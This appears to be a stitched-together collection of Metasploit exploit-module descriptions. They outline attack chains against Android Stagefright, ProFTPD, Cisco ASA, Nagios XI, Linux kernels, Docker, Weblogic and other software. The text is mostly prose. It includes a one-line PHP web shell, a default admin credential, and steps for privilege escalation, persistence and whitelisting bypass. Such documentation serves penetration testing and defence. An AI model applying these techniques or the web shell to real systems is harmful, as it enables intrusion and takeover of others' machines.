    "description": "This module exploits an integer overflow vulnerability in the Stagefright Library (libstagefright.so). The vulnerability occurs when parsing specially crafted MP4 files. While a wide variety of remote attack vectors exist, this particular exploit is designed to work within an HTML5 compliant browser. Exploitation is done by supplying a specially crafted MP4 file with two tx3g atoms that, when their sizes are summed, cause an integer overflow when processing the second atom. As a result, a temporary buffer is allocated with insufficient size and a memcpy call leads to a heap overflow. This version of the exploit uses a two-stage information leak based on corrupting the MetaData that the browser reads from mediaserver. This method is based on a technique published in NorthBit's Metaphor paper. First, we use a variant of their technique to read the address of a heap buffer located adjacent to a SampleIterator object as the video HTML element's videoHeight. Next, we read the vtable pointer from an empty Vector within the SampleIterator object using the video element's duration. This gives us a code address that we can use to determine the base address of libstagefright and construct a ROP chain dynamically. NOTE: the mediaserver process on many Android devices (Nexus, for example) is constrained by SELinux and thus cannot use the execve system call. To avoid this problem, the original exploit uses a kernel exploit payload that disables SELinux and spawns a shell as root. Work is underway to make the framework more amenable to these types of situations. Until that work is complete, this exploit will only yield a shell on devices without SELinux or with SELinux in permissive mode.",

Some distributions of the Android Browser app have an addJavascriptInterface call tacked on, and thus are vulnerable to RCE. The Browser app in the Google APIs 4.1.2 release of Android is known to be vulnerable. A secondary attack vector involves the WebViews embedded inside a large number of Android applications. Ad integrations are perhaps the worst offender here.

The DFG JIT does not take into account that, through the use of a Proxy, it is possible to run arbitrary JS code during the execution of a CreateThis operation. This makes it possible to change the structure of e.g. an argument without causing a bailout, leading to a type confusion (CVE-2018-4233). The type confusion leads to the ability to allocate fake Javascript objects, as well as the ability to find the address in memory of a Javascript object. This allows us to construct a fake JSCell object that can be used to read and write arbitrary memory from Javascript. The module then uses a ROP chain to write the first stage shellcode into executable memory within the Safari process and kick off its execution. The first stage maps the second stage macho (containing CVE-2017-13861) into executable memory, and jumps to its entrypoint. The CVE-2017-13861 async_wake exploit leads to a kernel task port (TFP0) that can read and write arbitrary kernel memory.

The affected Juniper devices run FreeBSD and every FreeBSD process can access their stdin by opening /dev/fd/0. The exploit also makes use of two useful PHP features. The first being 'auto_prepend_file' which causes the provided file to be added using the 'require' function. The second PHP function is 'allow_url_include' which allows the use of URL-aware fopen wrappers. By enabling allow_url_include, the exploit can use any protocol wrapper with auto_prepend_file. The module then uses data:// to provide a file inline which includes the base64 encoded PHP payload. By default this exploit returns a session confined to a FreeBSD jail with limited functionality. There is a datastore option 'JAIL_BREAK', that when set to true, will steal the necessary tokens from a user authenticated to the J-Web application, in order to overwrite the the root password hash. If there is no user authenticated to the J-Web application this method will not work. The module then authenticates with the new root password over SSH and then rewrites the original root password hash to /etc/master.passwd.",

    "description": "This module exploits a stack-based buffer overflow in versions 1.2 through 1.3.0 of ProFTPD server. The vulnerability is within the \"sreplace\" function within the \"src/support.c\" file. The off-by-one heap overflow bug in the ProFTPD sreplace function has been discovered about 2 (two) years ago by Evgeny Legerov. We tried to exploit this off-by-one bug via MKD command, but failed. We did not work on this bug since then. Actually, there are exists at least two bugs in sreplace function, one is the mentioned off-by-one heap overflow bug the other is a stack-based buffer overflow via 'sstrncpy(dst,src,negative argument)'. We were unable to reach the \"sreplace\" stack bug on ProFTPD 1.2.10 stable version, but the version 1.3.0rc3 introduced some interesting changes, among them: 1. another (integer) overflow in sreplace! 2. now it is possible to reach sreplace stack-based buffer overflow bug via the \"pr_display_file\" function! 3. stupid '.message' file display bug So we decided to choose ProFTPD 1.3.0 as a target for our exploit. To reach the bug, you need to upload a specially created .message file to a writeable directory, then do \"CWD <writeable directory>\" to trigger the invocation of sreplace function. Note that ProFTPD 1.3.0rc3 has introduced a stupid bug: to display '.message' file you also have to upload a file named '250'. ProFTPD 1.3.0 fixes this bug. The exploit is a part of VulnDisco Pack since Dec 2005.",

    "description": "This module exploits a stack-based buffer overflow in versions of ProFTPD server between versions 1.3.2rc3 and 1.3.3b. By sending data containing a large number of Telnet IAC commands, an attacker can corrupt memory and execute arbitrary code. The Debian Squeeze version of the exploit uses a little ROP stub to indirectly transfer the flow of execution to a pool buffer (the cmd_rec \"res\" in \"pr_cmd_read\"). The Ubuntu version uses a ROP stager to mmap RWX memory, copy a small stub to it, and execute the stub. The stub then copies the remainder of the payload in and executes it. NOTE: Most Linux distributions either do not ship a vulnerable version of ProFTPD, or they ship a version compiled with stack smashing protection. Although SSP significantly reduces the probability of a single attempt succeeding, it will not prevent exploitation. Since the daemon forks in a default configuration, the cookie value will remain the same despite some attempts failing. By making repeated requests, an attacker can eventually guess the cookie value and exploit the vulnerability. The cookie in Ubuntu has 24-bits of entropy. This reduces the effectiveness and could allow exploitation in semi-reasonable amount of time.",

If a valid combination is found, the module will use these to attempt exploitation. If LOCAL_DATA_ID and/or HOST_ID are both set, the module will immediately attempt exploitation. During exploitation, the module sends a GET request to /remote_agent.php with the action parameter set to polldata and the X-Forwarded-For header set to the provided value for X_FORWARDED_FOR_IP (by default 127.0.0.1). In addition, the poller_id parameter is set to the payload and the host_id and local_data_id parameters are set to the bruteforced or provided values. If X_FORWARDED_FOR_IP is set to an address that is resolvable to a hostname in the poller table, and the local_data_id and host_id values are vulnerable, the payload set for poller_id will be executed by the target.

    "description": "This module exploits an authenticated command injection vulnerability affecting Cisco ASA-X with FirePOWER Services. This exploit is executed through the ASA's ASDM web server and lands in the FirePower Services SFR module's Linux virtual machine as the root user. Access to the virtual machine allows the attacker to pivot to the inside network, and access the outside network. Also, the SFR virtual machine is running snort on the traffic flowing through the ASA, so the attacker should have access to this diverted traffic as well. This module requires ASDM credentials in order to traverse the ASDM interface. A similar attack can be performed via Cisco CLI (over SSH), although that isn't implemented here. Finally, it's worth noting that this attack bypasses the affects of the `lockdown-sensor` command (e.g. the virtual machine's bash shell shouldn't be available but this attack makes it available). Cisco assigned this issue CVE-2022-20828. The issue affects all Cisco ASA that support the ASA FirePOWER module (at least Cisco ASA-X with FirePOWER Service, and Cisco ISA 3000). The vulnerability has been patched in ASA FirePOWER module versions 6.2.3.19, 6.4.0.15, 6.6.7, and 7.0.21. The following versions will receive no patch: 6.2.2 and earlier, 6.3.*, 6.5.*, and 6.7.*.",

The vulnerability occurs using a PHP object creation in the `\\craft\\controllers\\ConditionsController` class which allows to run arbitrary PHP code by escalating the object creation calling some methods available in `\\GuzzleHttp\\Psr7\\FnStream`. Using this vulnerability in combination with The Imagick Extension and MSL which stands for Magick Scripting Language, a full RCE can be achieved. MSL is a built-in ImageMagick language that facilitates the reading of images, performance of image processing tasks, and writing of results back to the filesystem. This can be leveraged to create a dummy image containing malicious PHP code using the Imagick constructor class delivering a webshell that can be accessed by the attacker, thereby executing the malicious PHP code and gaining access to the system. Because of this, any remote attacker, without authentication, can exploit this vulnerability to gain access to the underlying operating system as the user that the web services are running as (typically www-data).",

    "description": "Several Dlink routers contain a pre-authentication stack buffer overflow vulnerability, which is exposed on the LAN interface on port 80. This vulnerability affects the HNAP SOAP protocol, which accepts arbitrarily long strings into certain XML parameters and then copies them into the stack. This exploit has been tested on the real devices DIR-818LW and 868L (rev. B), and it was tested using emulation on the DIR-822, 823, 880, 885, 890 and 895. Others might be affected, and this vulnerability is present in both MIPS and ARM devices. The MIPS devices are powered by Lextra RLX processors, which are crippled MIPS cores lacking a few load and store instructions. Because of this the payloads have to be sent unencoded, which can cause them to fail, although the bind shell seems to work well. For the ARM devices, the inline reverse tcp seems to work best. Check the reference links to see the vulnerable firmware versions.",

Valid credentials for such an account are required. Command execution will be in the context of the \"nobody\" account, but this account had broad sudo permissions, including to run the script /usr/local/bin/chrootpasswd (which changes the password for the Linux root account on the system to the value specified by console input once it is executed). The password for the proxy user account specified will *not* be changed by the use of this module, as long as the target system is vulnerable to the exploit. Very early versions of Endian Firewall (e.g. 1.1 RC5) require HTTP basic auth credentials as well to exploit this vulnerability. Use the USERNAME and PASSWORD advanced options to specify these values if required. Versions >= 3.0.0 still contain the vulnerable code, but it appears to never be executed due to a bug in the vulnerable CGI script which also prevents normal use (http://jira.endian.com/browse/UTM-1002). Versions 2.3.x and 2.4.0 are not vulnerable because of a similar bug (http://bugs.endian.com/print_bug_page.php?bug_id=3083).

Grav Admin Plugin is an HTML user interface that provides a way to configure Grav and create and modify pages. In versions 1.10.7 and earlier, an unauthenticated user can execute some methods of administrator controller without needing any credentials. Particular method execution will result in arbitrary YAML file creation or content change of existing YAML files on the system. Successfully exploitation of that vulnerability results in configuration changes, such as general site information change, custom scheduler job definition, etc. Due to the nature of the vulnerability, an adversary can change some part of the webpage, or hijack an administrator account, or execute operating system command under the context of the web-server user.",

Details about these vulnerabilities can be found in the advisories listed in References.

    "description": "A Command Injection vulnerability in MagnusBilling application 6.x and 7.x allows remote attackers to run arbitrary commands via unauthenticated HTTP request. A piece of demonstration code is present in `lib/icepay/icepay.php`, with a call to an exec(). The parameter to exec() includes the GET parameter `democ`, which is controlled by the user and not properly sanitised/escaped. After successful exploitation, an unauthenticated user is able to execute arbitrary OS commands. The commands run with the privileges of the web server process, typically `www-data` or `asterisk`. At a minimum, this allows an attacker to compromise the billing system and its database. The following MagnusBilling applications are vulnerable: - MagnusBilling application version 6 (all versions); - MagnusBilling application up to version 7.x without commit 7af21ed620 which fixes this vulnerability;",

    "description": "This module exploits a vulnerability in the getprofile.sh script of Nagios XI prior to 5.6.6 in order to upload a malicious check_ping plugin and thereby execute arbitrary commands. For Nagios XI 5.2.0-5.4.13, the commands are run as the nagios user. For versions 5.5.0-5.6.5 the commands are run as root. Note that versions prior to 5.2.0 will still be marked as being vulnerable however this module does not presently support exploiting these targets. The module uploads a malicious check_ping plugin to the Nagios XI server via /admin/monitoringplugins.php and then executes this plugin by issuing a HTTP GET request to download a system profile from the server. For all supported targets except Linux (cmd), the module uses a command stager to write the exploit to the target via the malicious plugin. This may not work if Nagios XI is running in a restricted Unix environment, so in that case the target must be set to Linux (cmd). The module then writes the payload to the malicious plugin while avoiding commands that may not be supported. Valid credentials for a user with administrative privileges are required. This module was successfully tested on Nagios XI 5.3.0 and Nagios 5.6.5, both running on CentOS 7. For vulnerable versions before 5.5.0, it may take a significant amount of time for the payload to get back (up to 5 minutes). If exploitation fails against an older system, it is recommended to increase the WfsDelay setting (default is 300 seconds). See the documentation for more information.",

This module takes advantage of a command injection vulnerability in the `Events` feature of Pandora FMS. This flaw allows users to execute arbitrary commands via the `target` parameter in HTTP POST requests to the `Events` function. After authenticating to the target, the module attempts to exploit this flaw by issuing such an HTTP POST request, with the `target` parameter set to contain the payload. If a shell is obtained, the module will try to obtain the local MySQL database password via a simple `grep` command on the plaintext `/var/www/html/pandora_console/include/config.php` file. Valid credentials for a Pandora FMS account are required. The account does not need to have admin privileges. This module has been successfully tested on Pandora 7.0 NG 744 running on CentOS 7 (the official virtual appliance ISO for this version).",

As the docker container executes command as uid 0 it is honored by the host operating system allowing the attacker to edit/create files owed by root. This exploit abuses this to creates a cron job in the '/etc/cron.d/' path of the host server. The Docker image should exist on the target system or be a valid image from hub.docker.com. Use `check` with verbose mode to get a list of exploitable Rancher Hosts managed by the target system.",

This module takes advantage of a command injection vulnerability in the `path` parameter of the ajax archive file functionality within the rConfig web interface in order to execute the payload. Valid credentials for a user with administrative privileges are required. However, this module can bypass authentication via SQLI. This module has been successfully tested on Rconfig 3.9.3 and 3.9.4. The steps are: 1. SQLi on /commands.inc.php allows us to add an administrative user. 2. An authenticated session is established with the newly added user 3. Command Injection on /lib/ajaxHandlers/ajaxArchiveFiles.php allows us to execute the payload. 4. Remove the added admin user. Tips : once you get a shell, look at the CVE-2019-19585. You will probably get root because rConfig install script add Apache user to sudoers with nopasswd ;-)",

Every 60 seconds, `salt-master` service performs a maintenance process check that reloads and executes all the `grains` on the `master`, including custom grain modules in the Extension Module directory. So, this module simply creates a Python script at this location and waits for it to be executed. The time interval is set to 60 seconds by default but can be changed in the `master` configuration file with the `loop_interval` option. Note that, if an administrator executes commands locally on the `master`, the maintenance process check will also be performed.

The module first performs a check to see if the target is WD MyCloud. If so, it attempts to trigger an authentication bypass (CVE-2018-17153) via a crafted GET request to /cgi-bin/network_mgr.cgi. If the server responds as expected, the module assesses the vulnerability status by attempting to exploit a commend injection vulnerability (CVE-2016-10108) in order to print a random string via the echo command. This is done via a crafted POST request to /web/google_analytics.php. If the server is vulnerable, the same command injection vector is leveraged to execute the payload. This module has been successfully tested against Western Digital MyCloud version 2.30.183. Note: based on the available disclosures, it seems that the command injection vector (CVE-2016-10108) might be exploitable without the authentication bypass (CVE-2018-17153) on versions before 2.21.126. The obtained results on 2.30.183 imply that the patch for CVE-2016-10108 did not actually remove the command injection vector, but only prevented unauthenticated access to it.",

The bug was initially introduced in 2011 and patched in version 4.10.6, potentially affecting a large number of kernels; however this exploit targets only systems using Ubuntu Xenial kernels 4.8.0 < 4.8.0-46, including Linux distros based on Ubuntu Xenial, such as Linux Mint. The target system must have unprivileged user namespaces enabled and two or more CPU cores. Bypasses for SMEP, SMAP and KASLR are included. Failed exploitation may crash the kernel. This module has been tested successfully on Linux Mint 18 (x86_64) with kernel versions: 4.8.0-34-generic; 4.8.0-36-generic; 4.8.0-39-generic; 4.8.0-41-generic; 4.8.0-42-generic; 4.8.0-44-generic; 4.8.0-45-generic.",

Similarly, Fedora is vulnerable when the kernel crash handler is configured to change root directory before executing ABRT, causing `usr/libexec/abrt-hook-ccpp` within the crashed task's directory to be executed. In both instances, the crash handler does not drop privileges, resulting in code execution as root.

The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102. The module exploits this vulnerability by overwriting a suid binary with the payload, executing it, and then writing the original data back. There are two major limitations of this exploit: the offset cannot be on a page boundary (it needs to write one byte before the offset to add a reference to this page to the pipe), and the write cannot cross a page boundary. This means the payload must be less than the page size (4096 bytes).",

    "description": "This module steals the user password of an administrative user on a desktop Linux system when it is entered for unlocking the screen or for doing administrative actions using PolicyKit. Then, it escalates to root privileges using sudo and the stolen user password. It exploits the design weakness that there is no trusted channel for transferring the password from the keyboard to the actual password verification against the shadow file (which is running as root since /etc/shadow is only readable to the root user). Both screensavers (xscreensaver/gnome-screensaver) and PolicyKit use a component running under the current user account to query for the password and then pass it to a setuid-root binary to do the password verification. Therefore, it is possible to inject a password stealer after compromising the user account. Since sudo requires only the user password (and not the root password of the system), stealing the user password of an administrative user directly allows escalating to root privileges. Please note, you have to start a handler as a background job before running this exploit since the exploit will only create a shell when the user actually enters the password (which may be hours after launching the exploit). Using exploit/multi/handler with the option ExitOnSession set to false should do the job.",

If the host kernel is vulnerable, its possible to escape the Docker image and achieve root on the host operating system. A vulnerability was found in the Linux kernel's cgroup_release_agent_write in the kernel/cgroup/cgroup-v1.c function. This flaw, under certain circumstances, allows the use of the cgroups v1 release_agent feature to escalate privileges and bypass the namespace isolation unexpectedly. More simply put, cgroups v1 has a feature called release_agent that runs a program when a process in the cgroup terminates. If notify_on_release is enabled, the kernel runs the release_agent binary as root. By editing the release_agent file, an attacker can execute their own binary with elevated privileges, taking control of the system. However, the release_agent file is owned by root, so only a user with root access can modify it.",

This issue can be exploited from a Linux desktop terminal, but not over an SSH session, as it requires execution from within the context of a user with an active Polkit agent. In the Linux kernel before 5.1.17, ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship, which allows local users to obtain root access by leveraging certain scenarios with a parent-child process relationship, where a parent drops privileges and calls execve (potentially allowing control by an attacker). One contributing factor is an object lifetime issue (which can also cause a panic). Another contributing factor is incorrect marking of a ptrace relationship as privileged, which is exploitable through (for example) Polkit's pkexec helper with PTRACE_TRACEME.",

This module abuses the known default encryption keys to inject a message into the communication bus.

This service exposes a function named 'insert_plugin_meta_info' which is vulnerable to an input validation flaw in a call to system().

The vulnerability was introduced by Debian and Ubuntu Redis packages that insufficiently sanitized the Lua environment. The maintainers failed to disable the package interface, allowing attackers to load arbitrary libraries. On a typical `redis` deployment (not docker), this module achieves execution as the `redis` user. Debian/Ubuntu packages run Redis using systemd with the \"MemoryDenyWriteExecute\" permission, which limits some of what an attacker can do. For example, staged meterpreter will fail when attempting to use mprotect. As such, stageless meterpreter is the preferred payload. Redis can be configured with authentication or not. This module will work with either configuration (provided you provide the correct authentication details). This vulnerability could theoretically be exploited across a few architectures: i386, arm, ppc, etc. However, the module only supports x86_64, which is likely to be the most popular version.",

When handling chained response packets, Samba fails to validate the offset value used when building the next part. By setting this value to a number larger than the destination buffer size, an attacker can corrupt memory. Additionally, setting this value to a value smaller than 'smb_wct' (0x24) will cause the header of the input buffer chunk to be corrupted. After close inspection, it appears that 3.0.x versions of Samba are not exploitable. Since they use an \"InputBuffer\" size of 0x20441, an attacker cannot cause memory to be corrupted in an exploitable way. It is possible to corrupt the heap header of the \"InputBuffer\", but it didn't seem possible to get the chunk to be processed again prior to process exit. In order to gain code execution, this exploit attempts to overwrite a \"talloc chunk\" destructor function pointer. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the nx memory protection.

By creating a user with a directory traversal payload as the username, commands can be written to a given directory. To use this module with the cron exploitation method, run the exploit using the given payload, host, and port. After running the exploit, the payload will be executed within 60 seconds. Due to differences in how cron may run in certain Linux operating systems such as Ubuntu, it may be preferable to set the target to Bash Completion as the cron method may not work. If the target is set to Bash completion, start a listener using the given payload, host, and port before running the exploit. After running the exploit, the payload will be executed when a user logs into the system. For this exploitation method, bash completion must be enabled to gain code execution. This exploitation method will leave an Apache James mail object artifact in the /etc/bash_completion.d directory and the malicious user account.",

Universal Plug and Play (UPnP), by default is enabled in most D-Link devices, on the port 1900. An attacker can perform a remote command execution by injecting the payload into the `Search Target` (ST) field of the SSDP M-SEARCH discover packet. After successful exploitation, an attacker will have full access with `root` user privileges. NOTE: Staged meterpreter payloads might core dump on the target, so use stage-less meterpreter payloads when using the Linux Dropper target. Some D-Link devices do not have the `wget` command so configure `echo` as flavor with the command set CMDSTAGER::FLAVOR echo.

As of Firefox 41, unsigned extensions can still be installed on Firefox Nightly, Unbranded and Development builds when configured with `xpinstall.signatures.required` set to `false`. Note: this module generates legacy extensions which are supported only in Firefox before version 57.",

If an attacker can manipulate the sasl.jaas.config property of any of the connector's Kafka clients to com.sun.security.auth.module.JndiLoginModule, it allows the server to establish a connection with the attacker's LDAP server and deserialize the LDAP response. This provides the attacker with the capability to execute java deserialization gadget chains on the Kafka connect server, potentially leading to unrestricted deserialization of untrusted data or even remote code execution (RCE) if there are relevant gadgets in the classpath.

A second vulnerability with similar characteristics also exists in both Git and Mercurial clients, on HFS+ file systems (Mac OS X) only, where certain Unicode codepoints are ignorable. The third vulnerability with similar characteristics only affects Mercurial clients on Windows, where Windows \"short names\" (MS-DOS-compatible 8.3 format) are supported.

This is possible when the current user is allowed to create `git hooks`, which is the default for administrative users. For non-administrative users, the permission needs to be specifically granted by an administrator. To achieve code execution, the module authenticates to the Gitea web interface, creates a temporary repository, sets a `post-receive` git hook with the payload and creates a dummy file in the repository. This last action will trigger the git hook and execute the payload. Everything is done through the web interface. It has been mitigated in version 1.13.0 by setting the Gitea `DISABLE_GIT_HOOKS` configuration setting to `true` by default. This disables this feature and prevents all users (including admin) from creating custom git hooks. This module has been tested successfully against docker versions 1.12.5, 1.12.6 and 1.13.6 with `DISABLE_GIT_HOOKS` set to `false`, and on version 1.12.6 on Windows.",

    "description": "This module leverages an insecure setting to get remote code execution on the target OS in the context of the user running Gogs. This is possible when the current user is allowed to create `git hooks`, which is the default for administrative users. For non-administrative users, the permission needs to be specifically granted by an administrator. To achieve code execution, the module authenticates to the Gogs web interface, creates a temporary repository, sets a `post-receive` git hook with the payload and creates a dummy file in the repository. This last action will trigger the git hook and execute the payload. Everything is done through the web interface. No mitigation has been implemented so far (latest stable version is 0.12.3). This module has been tested successfully against version 0.12.3 on docker. Windows version could not be tested since the git hook feature seems to be broken.",

The module first attempts to authenticate to HorizontCMS. It then tries to upload a malicious PHP file via an HTTP POST request to `/admin/file-manager/fileupload`. The server will rename this file to a random string. The module will therefore attempt to change the filename back to the original name via an HTTP POST request to `/admin/file-manager/rename`. For the `php` target, the payload is embedded in the uploaded file and the module attempts to execute the payload via an HTTP GET request to `/storage/file_name`. For the `linux` and `windows` targets, the module uploads a simple PHP web shell similar to `<?php system($_GET[\"cmd\"]); ?>`. Subsequently, it leverages the CmdStager mixin to deliver the final payload via a series of HTTP GET requests to the PHP web shell. Valid credentials for a HorizontCMS user with permissions to use the FileManager are required. This would be all users in the Admin, Manager and Editor groups if HorizontCMS is configured with the default group settings.This module has been successfully tested against HorizontCMS 1.0.0-beta running on Ubuntu 18.04.",

An unauthenticated attacker can leverage this to access the REST API and create a new administrator access token. This token can be used to upload a plugin which contains a Metasploit payload, allowing the attacker to achieve unauthenticated RCE on the target TeamCity server. On older versions of TeamCity, access tokens do not exist so the exploit will instead create a new administrator account before uploading a plugin. Older version of TeamCity have a debug endpoint (/app/rest/debug/process) that allows for arbitrary commands to be executed, however recent version of TeamCity no longer ship this endpoint, hence why a plugin is leveraged for code execution instead, as this is supported on all versions tested.",

    "description": "Atlassian Hipchat is a web service for internal instant messaging. A plugin is available for Jira that allows team collaboration at real time. A message can be used to inject Java code into a Velocity template, and gain code execution as Jira. Authentication is required to exploit this vulnerability, and you must make sure the account you're using isn't protected by captcha. By default, Java payload will be used because it is cross-platform, but you can also specify which native payload you want (Linux or Windows). HipChat for Jira plugin versions between 1.3.2 and 6.30.0 are affected. Jira versions between 6.3.5 and 6.4.10 are also affected by default, because they were bundled with a vulnerable copy of HipChat. When using the check command, if you supply a valid username and password, the module will be able to trigger the bug and check more accurately. If not, it falls back to passive, which can only tell if the target is running on a Jira version that is bundled with a vulnerable copy of Hipchat by default, which is less reliable. This vulnerability was originally discovered internally by Atlassian.",

The SQL injection can be used to achieve remote code execution as SYSTEM in Windows or as the user in Linux. This module exploits both PostgreSQL (newer builds) and MySQL (older or upgraded builds). MySQL targets are more reliable due to the use of relative paths; with PostgreSQL you should find the web root path via other means and specify it with WEB_ROOT. The injection is only exploitable via a GET request, which means that the payload has to be sent in chunks smaller than 8000 characters (URL size limitation). Small payloads and the use of exe-small is recommended, as you can only do between 10 and 20 injections before using up all the available ManagedConnections until the next server restart. This vulnerability exists in all versions released since 2006, however builds below DC v7 70200 and PMP v6 6500 do not ship with a JSP compiler.

The first vulnerability (CVE-2022-43939) is an authentication bypass which stems from a regex that allows any URL that ends in \"/\", followed by \"require\", optionally \"-js\" or \"-cfg\", any character, and then the string \"js\" followed optionally by \"?\" and then any characters of the attacker's choice. The second (CVE-2022-43769) is a server side template injection. This vulnerability allows RCE by making a GET request to /api/ldap/config/ldapTreeNodeChildren and setting the url parameter to ThymeLeaf template code. By abusing the ability to execute arbitrary Java classes within Thymeleaf templates, an attacker can execute arbitrary commands as the user running the Pentaho Business Analytics Server.",

First, it detects the correct parameters (Query String Length and custom header length) needed to trigger code execution. This step determines if the target is actually vulnerable (Check method). Then, the exploit sets a series of PHP INI directives to create a file locally on the target, which enables code execution through a query string parameter. This is used to execute normal payload stagers. Finally, this module does some cleanup by killing local PHP-FPM workers (those are spawned automatically once killed) and removing the created local file.",

The vulnerability occurs due to a lack of appropriate validation when uploading a malicious PNG file with embedded PHP code to the /cache/images/ directory on the web server using the vulnerable endpoint /index.php?module=EmailTemplates&action=AttachFiles. Once uploaded to the server, depending on server configuration, the attacker can access the malicious PNG file via HTTP or HTTPS, thereby executing the malicious PHP code and gaining access to the system. This vulnerability does not require authentication because there is a missing authentication check in the loadUser() method in include/MVC/SugarApplication.php. After a failed login, the session does not get destroyed and hence the attacker can continue to send valid requests to the application. Because of this, any remote attacker, regardless of authentication, can exploit this vulnerability to gain access to the underlying operating system as the user that the web services are running as (typically www-data).",

The second is a cmdi flaw using the timezone parameter in the admin_sys_time.cgi interface (CVE-2016-7547). Note: You have the option to use the authentication bypass or not since it requires that the server is rebooted. The password reset will render the authentication useless. Typically, if an administrator cant login, they will bounce the box. Therefore, this module performs a heartbeat request until the box is bounced and then attempts to login and to perform the command injection.

Authentication is required and 'gd' for PHP is required on the server. Then the Popular Post plugin is reconfigured to allow for an arbitrary URL for the post image in the widget. A post is made, then requests are sent to the post to make it more popular than the previous #1 by 5. Once the post hits the top 5, and after a 60sec (we wait 90) server cache refresh, the homepage widget is loaded which triggers the plugin to download the payload from our server.

    "description": "Oracle Weblogic 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 prior to the Jan 2023 security update are vulnerable to an unauthenticated remote code execution vulnerability due to a post deserialization vulnerability. This occurs when an attacker serializes a \"ForeignOpaqueReference\" class object, deserializes it on the target, and then post deserialization, calls the object's \"getReferent()\" method, which will make use of the \"ForeignOpaqueReference\" class's \"remoteJNDIName\" variable, which is under the attackers control, to do a remote loading of the JNDI address specified by \"remoteJNDIName\" via the \"lookup()\" function. This can in turn lead to a deserialization vulnerability whereby an attacker supplies the address of a HTTP server hosting a malicious Java class file, which will then be loaded into the Oracle Weblogic process's memory and an attempt to create a new instance of the attacker's class will be made. Attackers can utilize this to execute arbitrary Java code during the instantiation of the object, thereby getting remote code execution as the \"oracle\" user. This module exploits this vulnerability to trigger the JNDI connection to a LDAP server we control. The LDAP server will then respond with a remote reference response that points to a HTTP server that we control, where the malicious Java class file will be hosted. Oracle Weblogic will then make a HTTP request to retrieve the malicious Java class file, at which point our HTTP server will serve up the malicious class file and Oracle Weblogic will instantiate an instance of that class, granting us RCE as the \"oracle\" user.

You can also provide an application name to bypass this step, and exploit the application directly. The configuration overwrite is used to change an application server authentication method to \"CAM\", a proprietary IBM auth method, which is simulated by the exploit. The exploit then performs a fake authentication as admin, and finally abuses TM1 scripting to perform a command injection as root or SYSTEM. Testing was done on IBM PA 2.0.6 and IBM TM1 10.2.2 on Windows and Linux. Versions up to and including PA 2.0.8 are vulnerable. It is likely that versions earlier than TM1 10.2.2 are also vulnerable (10.2.2 was released in 2014).",

This vulnerability was patched by Stefan in version 4.5.0 and applies all previous versions supporting this function. This particular module targets numerous web applications and is based on the proof of concept provided by Stefan Esser. This vulnerability requires approximately 900k of data to trigger due the multiple Cookie headers requirement. Since we are already assuming a fast network connection, we use a 2Mb block of shellcode for the brute force, allowing quick exploitation for those with fast networks. One of the neat things about this vulnerability is that on x86 systems, the EDI register points into the beginning of the hashtable string. This can be used with an egghunter to quickly exploit systems where the location of a valid \"jmp EDI\" or \"call EDI\" instruction is known. The EDI method is faster, but the bandwidth-intensive brute force used by this module is more reliable across a wider range of systems.",

The provided command will download and execute a payload using either a specified scripting language interpreter or \"squiblydoo\" via regsvr32.exe for bypassing application whitelisting. The main purpose of this module is to quickly establish a session on a target machine when the attacker has to manually type in the command: e.g. Command Injection, RDP Session, Local Access or maybe Remote Command Execution. This attack vector does not write to disk so it is less likely to trigger AV solutions and will allow privilege escalations supplied by Meterpreter. When using either of the PSH targets, ensure the payload architecture matches the target computer or use SYSWOW64 powershell.exe to execute x86 payloads on x64 machines. Regsvr32 uses \"squiblydoo\" technique to bypass application whitelisting. The signed Microsoft binary file, Regsvr32, is able to request an .sct file and then execute the included PowerShell command inside of it. Similarly, the pubprn target uses the pubprn.vbs script to request and execute a .sct file. Both web requests (i.e., the .sct file and PowerShell download/execute) can occur on the same port. The SyncAppvPublishingServer target uses SyncAppvPublishingServer.exe Microsoft signed binary to request and execute a PowerShell script. This technique only works on Windows 10 builds <= 1709. \"PSH (Binary)\" will write a file to the disk, allowing for custom binaries to be served up to be downloaded and executed.",

These primitives allow us to write shellcode into a JIT region (RWX memory) containing the next stage of the exploit.

    "description": "This Metasploit module exploits a Remote Code Execution (RCE) vulnerability in Splunk Enterprise. The affected versions include 9.0.x before 9.0.7 and 9.1.x before 9.1.2. The exploitation process leverages a weakness in the XSLT transformation functionality of Splunk. Successful exploitation requires valid credentials, typically 'admin:changeme' by default. The exploit involves uploading a malicious XSLT file to the target system. This file, when processed by the vulnerable Splunk server, leads to the execution of arbitrary code. The module then utilizes the 'runshellscript' capability in Splunk to execute the payload, which can be tailored to establish a reverse shell. This provides the attacker with remote control over the compromised Splunk instance. The module is designed to work seamlessly, ensuring successful exploitation under the right conditions.",

    "description": "This module exploits a heap buffer overflow within versions of Exim prior to version 4.69. By sending a specially crafted message, an attacker can corrupt the heap and execute arbitrary code with the privileges of the Exim daemon. The root cause is that no check is made to ensure that the buffer is not full prior to handling '%s' format specifiers within the 'string_vformat' function. In order to trigger this issue, we get our message rejected by sending a message that is too large. This will call into log_write to log rejection headers (which is a default configuration setting). After filling the buffer, a long header string is sent. In a successful attempt, it overwrites the ACL for the 'MAIL FROM' command. By sending a second message, the string we sent will be evaluated with 'expand_string' and arbitrary shell commands can be executed. It is likely that this issue could also be exploited using other techniques such as targeting in-band heap management structures, or perhaps even function pointers stored in the heap. However, these techniques would likely be far more platform specific, more complicated, and less reliable. This bug was original found and reported in December 2008, but was not properly handled as a security issue. Therefore, there was a 2 year lag time between when the issue was fixed and when it was discovered being exploited in the wild. At that point, the issue was assigned a CVE and began being addressed by downstream vendors. An additional vulnerability, CVE-2010-4345, was also used in the attack that led to the discovery of danger of this bug. This bug allows a local user to gain root privileges from the Exim user account. If the Perl interpreter is found on the remote system, this module will automatically exploit the secondary bug as well to get root.",

NetConfig is the Aerohive/Extreme Networks HiveOS administrative webinterface. Vulnerable versions allow for LFI because they rely on a version of PHP 5 that is vulnerable to string truncation attacks. This module leverages this issue in conjunction with log poisoning to gain RCE as root. Upon successful exploitation, the Aerohive NetConfig application may hang for as long as the spawned shell remains open. For the Linux target, the MeterpreterTryToFork option (enabled by default) will likely prevent this. If the app hangs, closing the session should render it responsive again. The module provides an automatic cleanup option to clean the log. However, this option is disabled by default because any modifications to the /tmp/messages log, even via sed, may render the target (temporarily) unexploitable. This state can last over an hour. This module has been successfully tested against Aerohive NetConfig versions 8.2r4 and 10.0r7a.",

